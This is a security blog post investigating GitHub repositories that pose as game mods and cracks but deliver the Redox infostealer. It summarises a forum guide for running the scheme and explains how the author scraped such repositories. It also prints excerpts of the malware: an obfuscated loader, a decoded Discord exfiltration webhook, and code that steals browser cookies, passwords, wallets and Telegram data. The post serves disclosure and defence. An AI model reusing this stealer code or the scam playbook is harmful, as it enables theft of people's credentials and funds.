---
title: "Github scam investigation: Thousands of \"mods\" and \"cracks\" stealing your data"
url: "https://timsh.org/github-scam-investigation-thousands-of-mods-and-cracks-stealing-your-data/"
fetched_at: 2026-04-27T07:01:22.275761+00:00
source: "timsh.org"
tags: [blog, raw]
---

# Github scam investigation: Thousands of "mods" and "cracks" stealing your data

Source: https://timsh.org/github-scam-investigation-thousands-of-mods-and-cracks-stealing-your-data/

While looking through the articles on a "social engineering" themed forum I discovered a relatively new scam scheme that shocked me.
People create thousands of GitHub repositories with all sorts of things - from Roblox and Fortnite mods to "cracked" FL Studio and Photoshop.
As soon as you download and launch any of these, all the data from your computer is collected and sent to some discord server - where hundreds of people crawl through the data searching for crypto wallet private keys, bank accounts and social media credentials, and even Steam and Riot Games accounts.
TL;DR
I found a step-by-step guide to creating these scam repositories, broke it down and eventually found a couple of the repositories potentially created by the guide author.
Wrote a script that helped me find
1115
repositories built based on the instructions from the guide.
Less then 10% of them have open issues with complaints - others look just fine.
I collected all of them in a
single spreadsheet
.
Found the unpacked version of the malicious code and analysed each of the 1000+ rows. The obfuscated code is a version of Redox stealer that searches for all valuable things on victims` computer and silently sends them to some Discord server.
Some background
Recently I visited my "Archive" folder on Telegram to find an annoying channel I didn't want to unsubscribe from - and a message from a bot I used to use popped up at the top of the list with an eye-catching heading:
Translation: "our theme on [redacted]: link deposit on [redacted]: $10k"
A couple things before we start:
This is a bot for ... checking TikTok videos for shadow bans (yes, they exist).
I had a startup focused on promoting musicians on TikTok back in the day, and this bot was helpful when TikTok updated their anti-bot algorithms.
But, as I learned recently, it's mostly used by people who "arbitrage traffic" on TikTok to... well, to some dark and illegal things, like fake crypto exchanges or fake gambling, as you can see in the screenshot.
But this post is not about them!
All the content in it is mostly in Russian, as well as lots of sources for this post.
I'm sure that such schemes exist all over the world and it's just that I looked into this Telegram Bot first.
I decided to redact some screenshots and not provide direct links to some sources because they contain highly immoral information and I don't want to spread it. Anyone curious enough can find all mentioned things by themselves.
By the way, I think this is a very clever kind of promo for a very specific audience that can't be easily seen from the outside.
Since it's a message from the bot, you must already be subscribed to it to see it, and it will also send all users that didn't mute it a notification.
I think the conversion rates of these ads (each one costs 150$) are quite high.
Let's get back to the message on the screenshot - as well as other promotions of various scam "teams", it had a mention of a [redacted] forum that was acting as some sort of authority platform in this niche - the message implies that this specific "team" has deposited $10k to the forum in order to prove that they're legit or something. I decided to look into the forum and was shocked by what's out there in the clear web.
The "social engineering" forum
No .onion, no KYC, no "contact us to join" - I just created an account with email + password and was able to view all of the contents.
Inside - a panel for selling basically anything: accounts on all sorts of platforms, starting from TikTok and up to "old verified $100k+ spent Facebook Ads accounts" for... well, it's a theme for another post.
US-based 6+ months old instagram accounts for 50 cents
What turned out to be far more interesting is the
Articles
section.
The topics cover almost everything there is in the "
affiliate
" world - which is a fancy name for all sorts of scams that involve some tech "provider" and a "team" of people who attract "mammoths" to their website and share profits with the provider.
A good example is RaaS (ransomware as a service) - check out
this article
if you're interested, or a crypto drainer like
CryptoGrab
which is literally a scam platform that has a
registered company in the UK
- which they brag about in their
documentation
.
But we're not here to talk about these "famous" schemes – lots of researchers and cybersecurity agencies have investigated them.
As an example, Abnormal
posted an investigation about CryptoGrab
less then a week ago.
What appeared as a complete surprise and novelty to me was the article titled:
How to pour [traffic on] Github from A to Z
This post is a very long and detailed step-by-step instruction for creating and spreading hundreds of malicious GitHub repos masked as almost anything "juicy": popular game mods, "free" cracked apps like Adobe Photoshop and FL Studio, and lots of other things.
some of the placeholder images created by the author of that article and an example of a "Cracked" FL Studio repository readme
The main goal of malicious scripts under the hood is to collect so-called "logs".
"Log" is a file with data from victim's computer, including cookies, passwords, IP and sensitive files. Logs are collected by spreading "stealers" - special programs that run in the background while you're figuring out why your mod is not doing what it's supposed to.
We'll get into details of what is actually collected from victims' computer in a bit - let me first summarise the algorithm that the author proposes.
Dos and Don'ts of creating a stealer repository
You get a malware file from some source - it's described in the article but I don't think it's a good idea to share it here.
You register or preferably purchase dozens of GitHub accounts - for example, you can buy them for as little as 1.5$ / account:
Then you upload the malware as a .zip / .rar archive or just include a link to some anonymous file sharing service in the readme, so it's code can't be automatically detected by GitHub's anti-malware checks or read on site.
You create a readme file based on a template.
"how to start decorating a repository"
Let's look into the template intricacies
Author suggests to use ChatGPT or other LLM to slightly modify the text of the readme file while keeping all the important things in place
Your readme should contain pictures and/or videos of "real" mods, or even better - refer to a "legit" repository of some well-known game mod developer.
You should include fake screenshots from virustotal or other websites, saying that the extension was checked for malicious activity with 0/70 score!
so what are you waiting for?
But the most important part of the guide that the author dedicates a whole section to is
Topics
- those, as author claims, help even 0-star repos pop-up in organic Google searches like "Roblox mod" or whatever the kids are looking for.
A quote from the article translated to english:
When there are not enough topics, try mixing up the words:
capcut pro crack pc / capcut pro crack download for pc / free download capcut pro / download capcut pro crack
Add these words to the beginning and end of each topic: free / download / crack / cracked / for pc / pc crack и тд
For games, use words: download / free / cheat(s) / hack(s) / wallhack(s) / aimbot(s) and so on
When choosing a topic, check if it's banned at https://github.com/topics/{topic} - if it returns 404, the topic is banned.
Author also included a "sample" list of topics for a "Valorant Aimbot", which allowed me to instantly find the mentioned repository. It's still out there, by the way. On the 9th position in Google if you look for "Valorant Aimbot":
https://github.com/SoloYasko/Aimbot-Valorant
What the .rar hides
This first repo I found contained a clue that might've saved someone from falling for it - 2 issues on Github:
Let me first assure you that it's just this one repo that was "spoiled" by trojan hunters. I immediately found
another one
(almost identical) that has no issues.
Now, thanks to one of the issues contents, we can take a look at the actual code inside the .rar archive and what it does.
Caution: lots of code ahead
The script's purpose is to collect all sorts of information - even some basic info about your computer, like ip, geolocation and username:
def globalInfo():
    ip = getip()
    username = os.getenv('USERNAME')
    ipdatanojson = urlopen(Request(f'''https://geolocation-db.com/jsonp/{ip}''')).read().decode().replace('callback(', '').replace('})', '}')
    ipdata = loads(ipdatanojson)
    contry = ipdata['country_name']
    contryCode = ipdata['country_code'].lower()
    globalinfo = f''':flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`'''
    return globalinfo
Next comes a bunch of discord-related code - honestly, I didn't quite understand its purpose... yet.
But what's far more interesting is the code that comes right after:
import base64
import codecs
magic = 'bXlob29rID0gJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBp'
love = 'Y3qyLzuio2gmYmRjAGN0Zmp5BQV1BQDmZwDkZmtiIxcP'
god = 'eXZtQktFU1NVdjRmWW4wTElqbEJSNFZ6TVJURVBPS1ZK'
destiny = 'o1qTqxAyFTD3omAZqTAfHH1XER11nHk6IQH3nKShA0Va'
joy = 'rot13'
trust = eval('magic') + eval('codecs.decode(love, joy)') + eval('god') + eval('codecs.decode(destiny, joy)')
        eval(compile(base64.b64decode(eval('trust')), '<string>', 'exec'))

# I calculated this "trust" value: 
trust = "bXlob29rID0gJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwNTA0Mzc5ODI1ODQzMjQxMzgvVkpCeXZtQktFU1NVdjRmWW4wTElqbEJSNFZ6TVJURVBPS1ZKb1dGdkNlSGQ3bzNMdGNsUU1KRE11aUx6VDU3aXFuN0In"
The "trust" value, when base64-decoded, turns out to be a discord webhook link:
myhook = '
https://discord.com/api/webhooks/1050437982584324138/VJByvmBKESSUv4fYn0LIjlBR4VzMRTEPOKVJoWFvCeHd7o3LtclQMJDMuiLzT57iqn7B
'
All of user data, including cookies, passwords and a link to zipped sensitive files is sent to this Discord webhook:
def upload(name, link):
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0' }
            if name == 'wpcook':
                rb = ' | '.join((lambda .0: for da in .0: da)(cookiWords))
                # skipped some code
                data = {
                    'content': globalInfo(),
                    'embeds': [
                        {
                            'title': 'Redox | Cookies Stealer',
                            'description': f'''**Found**:\n{rb}\n\n**Data:**\n <a:1888_Wand_Black:957353744578781304> • **{CookiCount}** Cookies Found\n <a:LV1:1042397877722423368> • [RedoxCookies.txt]({link})''', # these morons love animated emojis
                            'color': 2895667,
                            'footer': {
                                'text': 'Redox Stealer',
                                'icon_url': "",
                    'username': 'Redox Stealer',
                    'avatar_url': '',
                    'attachments': [] }
                urlopen(Request(myhook, dumps(data).encode(), headers, **('data', 'headers'))) # here's the myhook reference
                LoadUrlib(hook, dumps(data).encode(), headers, **('data', 'headers'))
The avatar of the "sender" (lol)
The original name of this script turns out to be 'Redox' - a well-know malware actively spread across Telegram.
Then comes some code that collects the cookies, passwords, discord data and zips into the format that will later be sent to the webhook, from... sqlite database.
Yes, Redox creates and starts sqlite to gather all the data in a good-looking way.
def getCookie(path, arg):
    if not os.path.exists(path):
        return None
    pathC = None + arg + '/Cookies'
    #skip a few rows
    tempfold = None + 'wp' + ''.join((lambda .0: for i in .0:
random.choice('bcdefghijklmnopqrstuvwxyz'))(range(8))) + '.db'
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    pathKey = path + '/Local State'
    with open(pathKey, 'r', 'utf-8', **('encoding',)) as f:
                local_state = json_loads(f.read())
                None(None, None, None)

def getPassw(path, arg):
  #almost identical code

def GetDiscord(path, arg):
  #almost identical code

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        # skipped a bunch of code
    if not len(WalletsZip) == 0:
        wal = '<:ETH:975438262053257236> •  Wallets\n'
        for i in WalletsZip:
            wal += f'''└─ [{i[0]}]({i[1]})\n'''
    if not len(WalletsZip) == 0:
        ga = '<a:8593blackstar:1042395444606672927>  •  Gaming:\n'
        for i in GamingZip:
            ga += f'''└─ [{i[0]}]({i[1]})\n'''
    if not len(OtherZip) == 0:
        ot = '<a:LV1:1042397877722423368>  •  Apps\n'
        for i in OtherZip:
            ot += f'''└─ [{i[0]}]({i[1]})\n'''
The GatherZips one is interesting - it sorts the collected files into 3 categories: crypto wallets, gaming and all other apps.
Which goes to show you – these boys, they just wanna have fun and play games.
Next we have a few zipping functions that tell us a lot of things about this stealer:
def ZipTelegram(path, arg, procc):
    pathC = path
    name = arg
    if not os.path.exists(pathC):
        return None
    None.Popen(f'''taskkill /im {procc} /t /f >nul 2>&1''', True, **('shell',))
    zf = ZipFile(f'''{pathC}/{name}.zip''', 'w')
    for file in os.listdir(pathC):
        if '.zip' not in file and 'tdummy' not in file and 'user_data' not in file and 'webview' not in file:
            zf.write(pathC + '/' + file)
    zf.close()
    lnik = uploadToAnonfiles(f'''{pathC}/{name}.zip''')
    os.remove(f'''{pathC}/{name}.zip''')
    OtherZip.append([
        arg,
        lnik])
This function kills Telegram process if it's running, collects the associated files (chat history, media, settings, tokens etc) and sends it to Anonfiles - a free and anonymous file sharing site,
reported by some antivirus and malware detection
products as abused by criminals.
Next we have the ZipFiles - it's a long function that looks for specific things like Metamask wallet extension associated files, Steam loginusers.vdf file, containing user stream account info, Riot games accounts and more.
if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:
    browser = path.split('\\')[4].split('/')[1].replace(' ', '')
    name = f'''Metamask_{browser}'''
    pathC = path + arg
if not os.path.exists(pathC):
    return None
For example, this sophisticated looking piece of code is just a function that searches for Metamask chrome extension - the
nkbihfbeogaeaoehlefnkodbefgpgknn
is the extension's id:
https://chromewebstore.google.com/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn
And again uploads all of the zipped files to Anonfiles.
Then we have a
GatherAll()
function that provides a list of hardcoded paths to all sorts of things, including different browser folders for Opera, Chrome, Brave and so on. It even uses multithreading to collect the secrets faster.
The
uploadToAnonfiles(path)
function, by the way, suggests that this code is intentionally incomplete - possibly, to avoid malware activity detection by static analysis. Looks like the real functionality is injected on the go.
def uploadToAnonfiles(path):
    try:
        pass
    finally:
        return None
        return False
Finally, we get to the family of "Kiwi" functions:
KiwiFile
scans directories for files matching keywords.
KiwiFolder
handles subdirectories recursively.
Kiwi
includes a set of common directory names to look for:
def Kiwi():
    user = temp.split('\\AppData')[0]
    path2search = [
        user + '/Desktop',
        user + '/Downloads',
        user + '/Documents']
    key_wordsFolder = [
        'account',
        'acount',
        'passw',
        'secret']
    key_wordsFiles = [
        'passw',
        'mdp',
        'motdepasse',
        'mot_de_passe',
        'login',
        'secret',
        'account',
        'acount',
        'paypal',
        'banque',
        'account',
        'metamask',
        'wallet',
        'crypto',
        'exodus',
        'discord',
        '2fa',
        'code',
        'memo',
        'compte',
        'token',
        'backup',
        'secret']
And here's the list of all keywords, aka all of the apps that interest the stealer:
keyword = [
    'mail',
    '[coinbase](https://coinbase.com)',
    '[sellix](https://sellix.io)', # this one, by the way, is a hacker forum sealed by FBI less than a month ago: https://www.reddit.com/r/hacking/comments/1id2rhv/nulledto_crackedio_sellixio_starkrdpio_all_gone/
    '[gmail](https://gmail.com)',
    '[steam](https://steam.com)',
    '[discord](https://discord.com)',
    '[riotgames](https://riotgames.com)',
    '[youtube](https://youtube.com)',
    '[instagram](https://instagram.com)',
    '[tiktok](https://tiktok.com)',
    '[twitter](https://twitter.com)',
    '[facebook](https://facebook.com)',
    'card',
    '[epicgames](https://epicgames.com)',
    '[spotify](https://spotify.com)',
    '[yahoo](https://yahoo.com)',
    '[roblox](https://roblox.com)',
    '[twitch](https://twitch.com)',
    '[minecraft](https://minecraft.net)',
    'bank',
    '[paypal](https://paypal.com)',
    '[origin](https://origin.com)',
    '[amazon](https://amazon.com)',
    '[ebay](https://ebay.com)',
    '[aliexpress](https://aliexpress.com)',
    '[playstation](https://playstation.com)',
    '[hbo](https://hbo.com)',
    '[xbox](https://xbox.com)',
    'buy',
    'sell',
    '[binance](https://binance.com)',
    '[hotmail](https://hotmail.com)',
    '[outlook](https://outlook.com)',
    '[crunchyroll](https://crunchyroll.com)',
    '[telegram](https://telegram.com)',
    '[pornhub](https://pornhub.com)',
    '[disney](https://disney.com)', # how sweet of them ...
    '[expressvpn](https://expressvpn.com)',
    'crypto',
    '[uber](https://uber.com)',
    '[netflix](https://netflix.com)']
So, to wrap this section up - the Redox malware included in the archive spread on Github is looking for a lot of stuff on victim's computer, kills the necessary apps to go unnoticed and silently uploads files to some shady file sharing website, and links / credentials to some discord server.
Scam at a scale
Now that I knew what this downloadable something does, I was wondering of the scale of this thing - how much repositories are out there with these poisoned .rar archives?
A ballpark for that can be estimated from the forum itself: the author says it in the end of the guide. I quote:
If you're motivated enough, you should create more topics and upload them. As you reach 300-500 uploaded repositories, 10-30 of which are on top - they will generate
50-100+ logs daily
.
Check your topics once in a while - if any of them got banned, re-upload all affected repos with new tags.
Good luck!
So there should be hundreds of these uploaded just by a single person - so, potentially, thousands or more in total.
I could've stopped at this point since this is already an indicator of a wide-spread problem. But I decided to try a few things in order to estimate the amount of repos out there.
Searching on Github
I almost immediately came up with an idea - since I have an instruction for creating and choosing the topics provided by the author, I could try and search each of them and see if there are any repositories with such topics.
I tried it manually with 10 topics and was very excited to see that 10/10 included similar-looking repos with either README + .rar or just README with "download" link, leading to some shady file sharing service.
At this point I found out that this scam scheme must also be popular on Chinese "social engineering" forums,  since there are lots of the identical repos with readme  in Chinese.
Here's
one example
with a couple open issues - I translated it with google translate:
Scraping Github
After just 30 minutes of manual searching I felt like it was an effective method, meaning that the possibility that a repository is / looks malicious if it has one of the mentioned topics is quite high. Which is why I decided to write a simple script that:
Generates some simple topics using an instruction provided by the author - 1 base_keyword like csgo or fortnite + 1 topic_keyword like "cheat", "hack", "aimbot", then 1 base + 2 topic_keyword, e.t.c
Searches for each of them on Github using a
topic:{topic}
query and saves all found repos to a single .csv.
Checks each found repository structure for being suspicious - even a single README or README + some files + .rar/.exe./.zip.
Again, those that don't match the file structure pattern are still very likely to be malicious - but maybe using a slightly different approach.
For both base_keywords and topic_keywords I used lists  from the examples from the guide - as you can imagine, both of these could be expanded quite a lot, but I left them intentionally to see if even the simplest PoC would work:
base_keywords = [
    "Apex Legends", "CODMW", "cod warzone", "cs2", "dayz", "escape from tarkov",
    "five m", "fortnite", "genshin impact", "gta v", "lol", "league of legends",
    "minecraft", "overwatch", "pubg", "rainbow six siege", "roblox", "rust",
    "valorant", "fl studio", "fruity loops"
]

modifiers = [
    "download", "free", "crack", "cracked", "for pc", "pc crack",
    "cheat", "cheats", "hack", "hacks", "wallhack", "aimbot"
]
At first when I generated topics of length <= 4 words I got
38k
possible options. Since GitHub API search endpoint has a rate limit of 30 requests / minute, looking through all of them would take the script almost a full day.
I decided to limit the list of keywords to have 100 keyword combinations per app - for 21 apps, that gave me 2100 topics - more than enough for the PoC purposes.
Even with the simple PoC script, here's what I got:
All repositories:
Total rows:
1155
Rows with open_issues >= 1: 115
Malicious repositories (based on file structure):
Total rows:
351
Rows with open_issues >= 1: 11
115 have at least 1 open issue. I checked a few manually - all of the issues are either "this is not working" (and it shouldn't, by the way - it just needs to waste some of your time while it's looking for your data) or/and "this is a scam / malware / rat / virus / ...".
It's just 10% of the found repos. And with malicious ones, it's even worse - 11/351.
Open issues could potentially save someone from downloading and launching the malicious script.
I collected all of the repos in a
single spreadsheet
so you could explore it yourself:
I checked some of them - every single one seemed like it was made using some version of the mentioned guide.
Just take a look at some of the "beautiful" clickable images in the README files from those malicious repos - scary, right?
Conclusion
It's been a long journey and it's barely over - but I think it's more than enough to summarise and discuss the problem.
What still shocks me (although I'm starting to get used to it) is the kind of information you can freely access online ... without Tor, without invite, without anyone's approval.
And at the same time - how nicely it's hidden from most of us under a telegram bot that sends you scam job offers, or a forum/panel with a funny name.
The guide has lots of comments on the forum.
Some people ask for advice, others +rep the author, and some say that this is almost dead - "I used to get hundreds of logs with this a year ago, but now there are lots of script kiddies spoiling the results for all of us".
One user links another guide on how to unpack the stolen Steam accounts and sell the inventory - guess that's a topic for another post.
This Redox malware is so scary simple - 1000-row main.py is not what you expect to see when you hear about an evil malware stealing all the secrets.
Finally, what bugs me is that all these repos can definitely be identified by GitHub detection system. At least those with "DANGER THIS IS MALWARE" issues.
Why are they still out there in plain sight?
Would be nice if someone from Github read this and banned all of the repos in the spreadsheet as well as the associated accounts.
All right, I think it's a very long single post already.
Thanks for reading!
I'm currently working on another post about scams and their advertisement - please consider subscribing if you're interested.
sign up for tim.sh
my thoughts and research in security and privacy fields + some other stuff
No spam. No fucking tracking. Unsubscribe anytime.
